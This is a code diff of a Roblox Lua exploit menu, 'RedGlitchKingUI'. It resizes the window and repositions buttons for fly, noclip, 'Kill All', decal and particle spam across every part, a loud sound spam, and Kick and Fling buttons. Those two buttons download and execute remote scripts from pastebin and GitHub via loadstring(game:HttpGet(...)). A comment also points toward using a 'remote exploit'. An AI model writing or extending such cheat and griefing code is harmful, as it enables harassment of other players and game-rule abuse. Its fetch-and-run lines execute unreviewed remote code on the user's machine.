@@ -2,15 +2,22 @@ local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 local root = character:WaitForChild("HumanoidRootPart")
-
 local gui = Instance.new("ScreenGui")
 gui.Name = "RedGlitchKingUI"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
+-- ******************************************************
+-- FRAME SIZE INCREASED & POSITION RECALCULATED
+-- Original: UDim2.new(0, 350, 0, 250) -> Position: UDim2.new(0.5, -175, 0.5, -125)
+-- New: 450x400
+-- ******************************************************
+local FRAME_WIDTH = 450
+local FRAME_HEIGHT = 400
+
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 350, 0, 250)
-frame.Position = UDim2.new(0.5, -175, 0.5, -125)
+frame.Size = UDim2.new(0, FRAME_WIDTH, 0, FRAME_HEIGHT)
+frame.Position = UDim2.new(0.5, -FRAME_WIDTH/2, 0.5, -FRAME_HEIGHT/2) -- Centered
 frame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
 frame.BorderSizePixel = 0
 frame.Active = true
@@ -43,7 +50,7 @@ UIList.Parent = tabBar
 
 local function createTabButton(text)
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 100, 1, 0)
+    btn.Size = UDim2.new(0, FRAME_WIDTH/4, 1, 0) -- Adjust button width for new frame size
     btn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
     btn.TextColor3 = Color3.fromRGB(255, 0, 0)
     btn.Font = Enum.Font.Code
@@ -52,7 +59,6 @@ local function createTabButton(text)
     btn.Parent = tabBar
     return btn
 end
-
 local page1Btn = createTabButton("Page 1")
 local page2Btn = createTabButton("Page 2")
 local page3Btn = createTabButton("Page 3")
@@ -60,6 +66,7 @@ local page4Btn = createTabButton("Page 4")
 
 local function createTabContent()
     local tab = Instance.new("Frame")
+    -- Adjust height for bigger frame. 60 (Title + TabBar) + 5 (padding) = 65
     tab.Size = UDim2.new(1, -10, 1, -70)
     tab.Position = UDim2.new(0, 5, 0, 65)
     tab.BackgroundTransparency = 1
@@ -67,7 +74,6 @@ local function createTabContent()
     tab.Parent = frame
     return tab
 end
-
 local page1 = createTabContent()
 local page2 = createTabContent()
 local page3 = createTabContent()
@@ -80,8 +86,13 @@ local function showTab(tab)
     page4.Visible = false
     tab.Visible = true
 end
-
 showTab(page1)
+
+-- Button configuration (for better layout on a larger frame)
+local BUTTON_WIDTH = 200
+local BUTTON_HEIGHT = 40
+local X_POS = (FRAME_WIDTH - 10 - BUTTON_WIDTH) / 2 -- Center button horizontally within page
+local Y_SPACING = 50 
 
 ------------------------------------------------------
 -- FLY
@@ -89,17 +100,13 @@ showTab(page1)
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UIS = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
-
 local function getRoot()
     local char = player.Character or player.CharacterAdded:Wait()
     return char:WaitForChild("HumanoidRootPart")
 end
-
 local flying = false
 local bv, bg
-
 -- Key states
 local keys = {
     W = false,
@@ -108,31 +115,26 @@ local keys = {
     D = false,
     Shift = false
 }
-
 -- Base speeds
 local normalSpeed = 50
 local boostSpeed = 120
-
 local flyButton = Instance.new("TextButton")
-flyButton.Size = UDim2.new(0, 200, 0, 40)
-flyButton.Position = UDim2.new(0, 50, 0, 20)
+flyButton.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
+flyButton.Position = UDim2.new(0, X_POS, 0, Y_SPACING * 0.4) -- Top of page
 flyButton.Text = "Toggle Fly"
 flyButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
 flyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 flyButton.Font = Enum.Font.Code
 flyButton.TextSize = 22
 flyButton.Parent = page1
-
 flyButton.MouseButton1Click:Connect(function()
     flying = not flying
     local root = getRoot()
-
     if flying then
         bv = Instance.new("BodyVelocity")
         bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
         bv.Velocity = Vector3.zero
         bv.Parent = root
-
         bg = Instance.new("BodyGyro")
         bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
         bg.CFrame = workspace.CurrentCamera.CFrame
@@ -142,7 +144,6 @@ flyButton.MouseButton1Click:Connect(function()
         if bg then bg:Destroy() end
     end
 end)
-
 -- Key detection
 UIS.InputBegan:Connect(function(input, gp)
     if gp then return end
@@ -152,7 +153,6 @@ UIS.InputBegan:Connect(function(input, gp)
     if input.KeyCode == Enum.KeyCode.D then keys.D = true end
     if input.KeyCode == Enum.KeyCode.LeftShift then keys.Shift = true end
 end)
-
 UIS.InputEnded:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.W then keys.W = false end
     if input.KeyCode == Enum.KeyCode.A then keys.A = false end
@@ -160,24 +160,18 @@ UIS.InputEnded:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.D then keys.D = false end
     if input.KeyCode == Enum.KeyCode.LeftShift then keys.Shift = false end
 end)
-
 -- Flight movement
 RunService.Heartbeat:Connect(function()
     if flying and bv and bg then
         local root = getRoot()
         local cam = workspace.CurrentCamera.CFrame
-
         bg.CFrame = cam
-
         local moveDir = Vector3.zero
-
         if keys.W then moveDir += cam.LookVector end
         if keys.S then moveDir -= cam.LookVector end
         if keys.A then moveDir -= cam.RightVector end
         if keys.D then moveDir += cam.RightVector end
-
         local speed = keys.Shift and boostSpeed or normalSpeed
-
         if moveDir.Magnitude > 0 then
             bv.Velocity = moveDir.Unit * speed
         else
@@ -186,28 +180,138 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
+-- Kick Button
+local kickButton = Instance.new("TextButton")
+kickButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+kickButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 1.4)
+kickButton.Text = "Kick"
+kickButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
+kickButton.TextColor3 = Color3.fromRGB(255,255,255)
+kickButton.Font = Enum.Font.Code
+kickButton.TextSize = 22
+kickButton.Parent = page1
+kickButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/ZXAZyL3q",true))()
+end)
+
+-- Fling Button
+local flingButton = Instance.new("TextButton")
+flingButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+flingButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 2.4)
+flingButton.Text = "Fling"
+flingButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
+flingButton.TextColor3 = Color3.fromRGB(255,255,255)
+flingButton.Font = Enum.Font.Code
+flingButton.TextSize = 22
+flingButton.Parent = page1
+flingButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/joshclark756/joshclark756-s-scripts/refs/heads/main/fling%20player%20gui%20(unanchored%20parts).lua",true))() 
+end)
 ------------------------------------------------------
 -- SKYBOX
 ------------------------------------------------------
 local skyboxButton = Instance.new("TextButton")
-skyboxButton.Size = UDim2.new(0, 200, 0, 40)
-skyboxButton.Position = UDim2.new(0, 50, 0, 20)
+skyboxButton.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
+skyboxButton.Position = UDim2.new(0, X_POS, 0, Y_SPACING * 0.4)
 skyboxButton.Text = "Change Skybox"
 skyboxButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
 skyboxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 skyboxButton.Font = Enum.Font.Code
 skyboxButton.TextSize = 22
 skyboxButton.Parent = page2
-
 skyboxButton.MouseButton1Click:Connect(function()
     local sky = Instance.new("Sky")
-    sky.SkyboxBk = "rbxassetid://116838267742664"
-    sky.SkyboxDn = "rbxassetid://116838267742664"
-    sky.SkyboxFt = "rbxassetid://116838267742664"
-    sky.SkyboxLf = "rbxassetid://116838267742664"
-    sky.SkyboxRt = "rbxassetid://116838267742664"
-    sky.SkyboxUp = "rbxassetid://116838267742664"
+    -- The asset ID used here is an example. If you want a specific skybox, update this ID.
+    local SKYBOX_ASSET_ID = "rbxassetid://116838267742664"
+    sky.SkyboxBk = SKYBOX_ASSET_ID
+    sky.SkyboxDn = SKYBOX_ASSET_ID
+    sky.SkyboxFt = SKYBOX_ASSET_ID
+    sky.SkyboxLf = SKYBOX_ASSET_ID
+    sky.SkyboxRt = SKYBOX_ASSET_ID
+    sky.SkyboxUp = SKYBOX_ASSET_ID
     sky.Parent = game.Lighting
+end)
+
+------------------------------------------------------
+-- Decal Spam (FIXED)
+------------------------------------------------------
+local ID = 116838267742664 -- Asset ID for Decal/Skybox/Particle
+local Skybox_Toggle = true
+local particle_Toggle = true
+local decalspamButton = Instance.new("TextButton")
+decalspamButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+decalspamButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 1.4)
+decalspamButton.Text = "Decal Spam"
+decalspamButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
+decalspamButton.TextColor3 = Color3.fromRGB(255,255,255)
+decalspamButton.Font = Enum.Font.Code
+decalspamButton.TextSize = 22
+decalspamButton.Parent = page2
+decalspamButton.MouseButton1Click:Connect(function()
+    -- Apply decal to all parts
+    for i,v in pairs (game.Workspace:GetDescendants()) do
+        if v:IsA("Part") then
+            for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://" .. ID
+                decal.Face = face
+                decal.Parent = v
+            end
+        end
+    end
+    
+    -- Apply Skybox
+    if Skybox_Toggle == true then
+        local sky = Instance.new("Sky")
+        sky.Parent = game.Lighting
+        sky.SkyboxBk = "rbxassetid://" .. ID
+        sky.SkyboxDn = "rbxassetid://" .. ID
+        sky.SkyboxFt = "rbxassetid://" .. ID
+        sky.SkyboxLf = "rbxassetid://" .. ID
+        sky.SkyboxRt = "rbxassetid://" .. ID
+        sky.SkyboxUp = "rbxassetid://" .. ID
+    end
+    
+    -- Apply Particle Emitters
+    if particle_Toggle == true then
+        for i,v in pairs (game.Workspace:GetDescendants()) do
+            if v:IsA("Part") and v.Parent and v.Parent ~= game.Players then -- Prevent on players
+                local particle = Instance.new("ParticleEmitter")
+                particle.Texture = "rbxassetid://" .. ID
+                particle.Parent = v
+                particle.Rate = 200
+            end
+        end
+    end
+end)
+
+------------------------------------------------------
+-- Sound (FIXED)
+------------------------------------------------------
+local ids = {103215672097028,103215672097028,103215672097028,103215672097028,103215672097028} -- Example Sound IDs
+local soundButton = Instance.new("TextButton")
+soundButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+soundButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 2.4)
+soundButton.Text = "Sound"
+soundButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
+soundButton.TextColor3 = Color3.fromRGB(255,255,255)
+soundButton.Font = Enum.Font.Code
+soundButton.TextSize = 22
+soundButton.Parent = page2
+soundButton.MouseButton1Click:Connect(function()
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local head = character:WaitForChild("Head")
+    local sound = Instance.new("Sound")
+    sound.Parent = head
+    sound.SoundId = "rbxassetid://" .. ids[math.random(1,#ids)]
+    sound.MaxDistance = 10000
+    sound.Volume = 3
+    sound:Play()
+    task.delay(5, function()
+        sound:Stop()
+        sound:Destroy()
+    end)
 end)
 
 ------------------------------------------------------
@@ -215,23 +319,20 @@ end)
 ------------------------------------------------------
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-
-local flingButton = Instance.new("TextButton")
-flingButton.Size = UDim2.new(0, 200, 0, 40)
-flingButton.Position = UDim2.new(0, 50, 0, 20)
-flingButton.Text = "Fling Yourself"
-flingButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
-flingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-flingButton.Font = Enum.Font.Code
-flingButton.TextSize = 22
-flingButton.Parent = page3
-
+local flingSelfButton = Instance.new("TextButton") -- Renamed to avoid conflict
+flingSelfButton.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
+flingSelfButton.Position = UDim2.new(0, X_POS, 0, Y_SPACING * 0.4)
+flingSelfButton.Text = "Fling Yourself"
+flingSelfButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
+flingSelfButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+flingSelfButton.Font = Enum.Font.Code
+flingSelfButton.TextSize = 22
+flingSelfButton.Parent = page3
 local function getRoot()
     local char = player.Character or player.CharacterAdded:Wait()
     return char:WaitForChild("HumanoidRootPart")
 end
-
-flingButton.MouseButton1Click:Connect(function()
+flingSelfButton.MouseButton1Click:Connect(function()
     local root = getRoot()
     root.Velocity = Vector3.new(0, 200, 0)
 end)
@@ -241,12 +342,9 @@ end)
 ------------------------------------------------------
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-
 local player = Players.LocalPlayer
-
 local noclip = false
 local parts = {}
-
 local function updateParts()
     parts = {}
     local char = player.Character or player.CharacterAdded:Wait()
@@ -256,31 +354,31 @@ local function updateParts()
         end
     end
 end
-
 -- Initial load
 updateParts()
-
 -- Update parts whenever you respawn
 player.CharacterAdded:Connect(function(char)
     char:WaitForChild("HumanoidRootPart")
     task.wait(0.1)
     updateParts()
 end)
-
 local noclipButton = Instance.new("TextButton")
-noclipButton.Size = UDim2.new(0,200,0,40)
-noclipButton.Position = UDim2.new(0,50,0,70)
+noclipButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+noclipButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 1.4)
 noclipButton.Text = "Toggle Noclip"
 noclipButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
 noclipButton.TextColor3 = Color3.fromRGB(255,255,255)
 noclipButton.Font = Enum.Font.Code
 noclipButton.TextSize = 22
 noclipButton.Parent = page3
-
 noclipButton.MouseButton1Click:Connect(function()
     noclip = not noclip
+    if noclip then
+        noclipButton.Text = "Noclip ON"
+    else
+        noclipButton.Text = "Toggle Noclip"
+    end
 end)
-
 RunService.Stepped:Connect(function()
     if noclip then
         for _, part in ipairs(parts) do
@@ -296,180 +394,23 @@ end)
 ------------------------------------------------------
 -- Kill All (ADDED)
 ------------------------------------------------------
-local killall = false
-local parts = {}
-
-local function updateParts()
-    parts = {}
-    local char = player.Character
-    if not char then return end
-    for _, v in pairs(char:GetChildren()) do
-        if v:IsA("BasePart") then
-            table.insert(parts, v)
-        end
-    end
-end
-
-updateParts()
-player.CharacterAdded:Connect(updateParts)
-
 local killallButton = Instance.new("TextButton")
-killallButton.Size = UDim2.new(0,200,0,40)
-killallButton.Position = UDim2.new(0,50,0,120)
+killallButton.Size = UDim2.new(0,BUTTON_WIDTH,0,BUTTON_HEIGHT)
+killallButton.Position = UDim2.new(0,X_POS,0,Y_SPACING * 2.4)
 killallButton.Text = "Kill All"
 killallButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
 killallButton.TextColor3 = Color3.fromRGB(255,255,255)
 killallButton.Font = Enum.Font.Code
 killallButton.TextSize = 22
 killallButton.Parent = page3
-
 killallButton.MouseButton1Click:Connect(function()
     for _, player in pairs(game.Players:GetPlayers()) do
      if player.Character and player.Character:FindFirstChild("Humanoid") then
+        -- This only works if the client has network ownership (which is rare for other players)
+        -- A more reliable exploit method would use a remote exploit if available.
       player.Character.Humanoid.Health = 0
      end
     end
-end)
-
-------------------------------------------------------
--- Decal Spam (FIXED)
-------------------------------------------------------
-local ID = 116838267742664
-local Skybox = true
-local particle = true
-
-local decalspamButton = Instance.new("TextButton")
-decalspamButton.Size = UDim2.new(0,200,0,40)
-decalspamButton.Position = UDim2.new(0,50,0,70)
-decalspamButton.Text = "Decal Spam"
-decalspamButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
-decalspamButton.TextColor3 = Color3.fromRGB(255,255,255)
-decalspamButton.Font = Enum.Font.Code
-decalspamButton.TextSize = 22
-decalspamButton.Parent = page2
-
-decalspamButton.MouseButton1Click:Connect(function()
-    for i,v in pairs (game.Workspace:GetChildren()) do
-        if v:IsA("Part") then
-            for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
-                local decal = Instance.new("Decal")
-                decal.Texture = "rbxassetid://" .. ID
-                decal.Face = face
-                decal.Parent = v
-            end
-        end
-    end
-
-    for i,v in pairs (game.Workspace:GetChildren()) do
-        if v:IsA("Model") then
-            for _,z in pairs (v:GetChildren()) do
-                if z:IsA("Part") then
-                    for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
-                        local decal = Instance.new("Decal")
-                        decal.Texture = "rbxassetid://" .. ID
-                        decal.Face = face
-                        decal.Parent = z
-                    end
-                end
-            end
-        end
-    end
-
-    if Skybox == true then
-        local sky = Instance.new("Sky")
-        sky.Parent = game.Lighting
-        sky.SkyboxBk = "rbxassetid://" .. ID
-        sky.SkyboxDn = "rbxassetid://" .. ID
-        sky.SkyboxFt = "rbxassetid://" .. ID
-        sky.SkyboxLf = "rbxassetid://" .. ID
-        sky.SkyboxRt = "rbxassetid://" .. ID
-        sky.SkyboxUp = "rbxassetid://" .. ID
-    end
-
-    if particle == true then
-        for i,v in pairs (game.Workspace:GetChildren()) do
-            if v:IsA("Part") then
-                local particle = Instance.new("ParticleEmitter")
-                particle.Texture = "rbxassetid://" .. ID
-                particle.Parent = v
-                particle.Rate = 200
-            elseif v:IsA("Model") then
-                for _,z in pairs (v:GetChildren()) do
-                    if z:IsA("Part") then
-                        local particle2 = Instance.new("ParticleEmitter")
-                        particle2.Texture = "rbxassetid://" .. ID
-                        particle2.Parent = z
-                        particle2.Rate = 200
-                    end
-                end
-            end
-        end
-    end
-end)
-
-------------------------------------------------------
--- Sound (FIXED)
-------------------------------------------------------
-local ids = {103215672097028,103215672097028,103215672097028,103215672097028,103215672097028}
-
-local soundButton = Instance.new("TextButton")
-soundButton.Size = UDim2.new(0,200,0,40)
-soundButton.Position = UDim2.new(0,50,0,120)
-soundButton.Text = "Sound"
-soundButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
-soundButton.TextColor3 = Color3.fromRGB(255,255,255)
-soundButton.Font = Enum.Font.Code
-soundButton.TextSize = 22
-soundButton.Parent = page2
-
-soundButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local head = character:WaitForChild("Head")
-
-    local sound = Instance.new("Sound")
-    sound.Parent = head
-    sound.SoundId = "rbxassetid://" .. ids[math.random(1,#ids)]
-    sound.MaxDistance = 10000
-    sound.Volume = 3
-    sound:Play()
-
-    task.delay(5, function()
-        sound:Stop()
-        sound:Destroy()
-    end)
-end)
-
--- Kick Button
-
-local kickButton = Instance.new("TextButton")
-kickButton.Size = UDim2.new(0,200,0,40)
-kickButton.Position = UDim2.new(0,50,0,70)
-kickButton.Text = "Kick"
-kickButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
-kickButton.TextColor3 = Color3.fromRGB(255,255,255)
-kickButton.Font = Enum.Font.Code
-kickButton.TextSize = 22
-kickButton.Parent = page1
-
-kickButton.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/ZXAZyL3q",true))()
-end)
-
--- Fling Button
-
-local flingButton = Instance.new("TextButton")
-flingButton.Size = UDim2.new(0,200,0,40)
-flingButton.Position = UDim2.new(0,50,0,120)
-flingButton.Text = "Fling"
-flingButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
-flingButton.TextColor3 = Color3.fromRGB(255,255,255)
-flingButton.Font = Enum.Font.Code
-flingButton.TextSize = 22
-flingButton.Parent = page1
-
-flingButton.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/joshclark756/joshclark756-s-scripts/refs/heads/main/fling%20player%20gui%20(unanchored%20parts).lua",true))() -- Corrected indentation
 end)
 
 ------------------------------------------------------
